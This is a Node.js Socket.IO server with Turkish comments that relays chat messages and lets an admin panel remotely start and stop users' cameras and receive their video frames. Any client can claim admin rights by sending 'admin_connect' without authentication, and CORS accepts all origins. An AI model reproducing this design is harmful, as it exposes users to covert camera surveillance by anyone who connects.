// socket-server.js
const { Server } = require("socket.io");
const http = require("http");
const cors = require("cors");
const express = require("express");

//this is for logging
const fs = require("fs");
const path = require("path");
const logDir = path.join(__dirname, "logs");
const logFilePath = path.join(logDir, "admin_panel.log");

// Log klasörünü oluştur (yoksa)
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir, { recursive: true });
}

const app = express();
app.use(cors());

// CORS origin'leri çevresel değişkenlerden al
const corsOrigins = process.env.CORS_ORIGINS ? process.env.CORS_ORIGINS.split(',') : ["*"];
console.log("CORS origins:", corsOrigins);

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", // Daha geniş CORS kuralları - güvenlik için daha sonra düzenlenebilir
    methods: ["GET", "POST"],
    credentials: true,
    allowedHeaders: ["*"]
  },
  path: "/socket.io/", // Path doğru ayarlandığından emin oluyoruz
  serveClient: false,
  transports: ["websocket", "polling"],
  pingTimeout: 20000, // Ping timeout değerini artır
  pingInterval: 25000,
  connectTimeout: 10000, // Bağlantı süresini artır
  allowEIO3: true, // Socket.IO v3 uyumluluğu için
  maxHttpBufferSize: 1e8 // Büyük frame'ler için buffer size artırıldı
});

function logToFile(message, level = "INFO", source = "SOCKET") {
  try {
    const logEntry = `${new Date().toISOString()} [${source}] [${level}] ${message}\n`;
    fs.appendFileSync(logFilePath, logEntry);
  } catch (err) {
    console.error("Log yazma hatası:", err.message);
  }
}

// API çağrıları için retry mekanizması
async function fetchWithRetry(url, options, maxRetries = 3, delay = 1000) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      // Fetch isteği için timeout ekle
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 saniye timeout
      
      const response = await fetch(url, {
        ...options,
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      lastError = error;
      logToFile(`API çağrısı başarısız (${i+1}/${maxRetries}): ${error.message}`, "ERROR", "API");
      console.error(`API çağrısı başarısız (${i+1}/${maxRetries}):`, error.message);
      
      // Son deneme değilse bekle
      if (i < maxRetries - 1) {
        await new Promise(resolve => setTimeout(resolve, delay));
        // Her denemede gecikmeyi 2 katına çıkar (exponential backoff)
        delay *= 2;
      }
    }
  }
  
  throw lastError;
}

const connectedUsers = {};
const adminConnections = [];

// 30 saniye aralıklarla bağlantı durumu kontrolü
setInterval(() => {
  const userCount = Object.keys(connectedUsers).length;
  const adminCount = adminConnections.length;
  console.log(`Bağlantı durumu: ${userCount} kullanıcı, ${adminCount} admin bağlı`);
  logToFile(`Bağlantı durumu: ${userCount} kullanıcı, ${adminCount} admin bağlı`, "INFO", "CONNECTION-CHECK");
}, 30000);

io.on("connection", (socket) => {
  console.log("Bir kullanıcı bağlandı:", socket.id);
  logToFile(`Kullanıcı ${socket.id} bağlantıyı açtı.`);
  
  // Bağlantı bilgilerini logla
  const clientInfo = {
    socketId: socket.id,
    transport: socket.conn.transport.name,
    ip: socket.handshake.address,
    userAgent: socket.handshake.headers["user-agent"],
    query: socket.handshake.query
  };
  logToFile(`Bağlantı detayları: ${JSON.stringify(clientInfo)}`, "DEBUG", "CONNECTION");
  
  // Admin bağlantıları için
  socket.on("admin_connect", () => {
    console.log(`Admin bağlandı: ${socket.id}`);
    logToFile(`Admin bağlandı: ${socket.id}`, "INFO", "SOCKET");
    adminConnections.push(socket.id);
    socket.join("admin-room");
  });
  
  // Kullanıcı login olduysa bağlandığında user_id bilgisini yollamalı
  socket.on("user_login", (userId) => {
    // Eski bağlantıyı kontrol et ve kapat
    const existingSocketId = connectedUsers[userId];
    if (existingSocketId && existingSocketId !== socket.id) {
      const existingSocket = io.sockets.sockets.get(existingSocketId);
      if (existingSocket) {
        logToFile(`Kullanıcı ${userId} için eski bağlantı (${existingSocketId}) kapatılıyor.`, "INFO", "SOCKET");
        existingSocket.disconnect();
      }
    }
    
    // Yeni bağlantıyı kaydet
    connectedUsers[userId] = socket.id;
    console.log(`Kullanıcı ${userId} giriş yaptı.`);
    logToFile(`Kullanıcı ${userId} giriş yaptı. Socket ID: ${socket.id}`, "INFO", "SOCKET");
    
    // Client'a onay gönder
    socket.emit("login_confirmed", { userId, socketId: socket.id });
  });

  // Video frame alıcı
  socket.on("video_frame", (frameData) => {
    // Admin panel bağlantılarına frame gönder
    io.to("admin-room").emit("client_video_frame", {
      socketId: socket.id,
      userId: frameData.userId,
      frame: frameData.frame,
      timestamp: frameData.timestamp
    });
  });

  // Mesaj gönderme
  socket.on("send_message", async ({ chat_id, sender_id, receiver_id, content, sent_at }) => {
    console.log(`[SOCKET] Mesaj geldi: ${content} (${sender_id} ➝ ${receiver_id})`);
    logToFile(`Yeni mesaj: sender=${sender_id}, receiver=${receiver_id}, chat=${chat_id}`, "INFO", "MESSAGE");
    
    const messageData = {
      chat_id,
      sender_id,
      receiver_id,
      content,
      sent_at: sent_at || new Date().toISOString()
    };

    // Alıcıya mesaj iletiliyor
    const receiverSocket = connectedUsers[receiver_id];
    if (receiverSocket) {
      io.to(receiverSocket).emit("new_message", messageData);
      logToFile(`Mesaj alıcıya iletildi (${receiver_id}, socket: ${receiverSocket})`, "INFO", "MESSAGE");
    } else {
      logToFile(`Alıcı çevrimiçi değil, mesaj kayda alınacak (${receiver_id})`, "INFO", "MESSAGE");
    }

    // Mesajı backend API'sine kaydet
    try {
      const data = await fetchWithRetry("http://backend:8000/messages/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id, 
          sender_id, 
          content,
          receiver_id // Receiver ID'yi de gönder
        })
      });
      
      console.log("Mesaj API'ye kaydedildi:", data);
      logToFile(`Mesaj backend'e kaydedildi: ${JSON.stringify(data)}`, "INFO", "MESSAGE");
      
      // Başarılı mesaj onayı
      socket.emit("message_sent", { 
        success: true, 
        message_id: data.message_id || data.id,
        chat_id,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error("Mesaj API'ye kaydedilemedi:", error);
      logToFile(`Mesaj API'ye kaydedilemedi: ${error.message}`, "ERROR", "MESSAGE");
      
      // Hata durumunda bildirim gönder
      socket.emit("message_error", { 
        success: false, 
        error: "Mesaj sunucuya kaydedilemedi, lütfen daha sonra tekrar deneyin.",
        chat_id,
        timestamp: new Date().toISOString()
      });
    }
  });

  socket.on("disconnect", () => {
    console.log("Bir kullanıcı ayrıldı:", socket.id);
    logToFile(`Kullanıcı ${socket.id} bağlantıyı kapattı.`, "INFO", "SOCKET");

    // Admin bağlantılarından çıkar
    const adminIndex = adminConnections.indexOf(socket.id);
    if (adminIndex !== -1) {
      adminConnections.splice(adminIndex, 1);
    }

    // connectedUsers'tan sil
    for (let uid in connectedUsers) {
      if (connectedUsers[uid] === socket.id) {
        delete connectedUsers[uid];
        logToFile(`Kullanıcı ${uid} bağlantısı kaldırıldı (socket: ${socket.id})`, "INFO", "SOCKET");
        break;
      }
    }
  });

  socket.on("user_logout", (userId) => {
    console.log(`Kullanıcı ${userId} çıkış yaptı.`);
    logToFile(`Kullanıcı ${userId} çıkış yaptı.`, "INFO", "SOCKET");
    delete connectedUsers[userId];
  });
  
  // Admin komutları
  socket.on("admin_command", (command) => {
    if (adminConnections.includes(socket.id)) {
      console.log(`Admin komutu alındı: ${command.action}`);
      
      // Kamera başlatma komutu
      if (command.action === "start_camera" && command.targetUserId) {
        const targetSocket = connectedUsers[command.targetUserId];
        if (targetSocket) {
          io.to(targetSocket).emit("admin_command", { action: "start_camera" });
          logToFile(`Admin ${socket.id} kullanıcı ${command.targetUserId} için kamera başlattı`, "INFO", "ADMIN-COMMAND");
        }
      }
      
      // Kamera kapatma komutu
      if (command.action === "stop_camera" && command.targetUserId) {
        const targetSocket = connectedUsers[command.targetUserId];
        if (targetSocket) {
          io.to(targetSocket).emit("admin_command", { action: "stop_camera" });
          logToFile(`Admin ${socket.id} kullanıcı ${command.targetUserId} için kamerayı kapattı`, "INFO", "ADMIN-COMMAND");
        }
      }
    }
  });
  
  // Ping kontrolü
  socket.on("ping", (callback) => {
    if (typeof callback === "function") {
      callback({ time: Date.now(), socketId: socket.id });
    }
  });
});

// Sağlık kontrolü
app.get("/health", (req, res) => {
  const status = {
    uptime: process.uptime(),
    timestamp: Date.now(),
    connections: {
      users: Object.keys(connectedUsers).length,
      admins: adminConnections.length,
      total: io.engine.clientsCount
    },
    memory: process.memoryUsage()
  };
  
  res.json(status);
});

// Debug bilgisi
app.get("/", (req, res) => {
  res.send("Socket.IO sunucusu çalışıyor");
});

server.listen(3000, () => {
  console.log("Socket.IO server is running on port 3000");
  logToFile("Socket.IO sunucu başlatıldı (port: 3000)", "INFO", "SERVER");
});

// Beklenmeyen hataları yakala
process.on('uncaughtException', (error) => {
  console.error('Beklenmeyen hata:', error);
  logToFile(`Beklenmeyen hata: ${error.message}\n${error.stack}`, "ERROR", "SERVER");
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('İşlenmeyen söz reddi:', reason);
  logToFile(`İşlenmeyen söz reddi: ${reason}`, "ERROR", "SERVER");
});
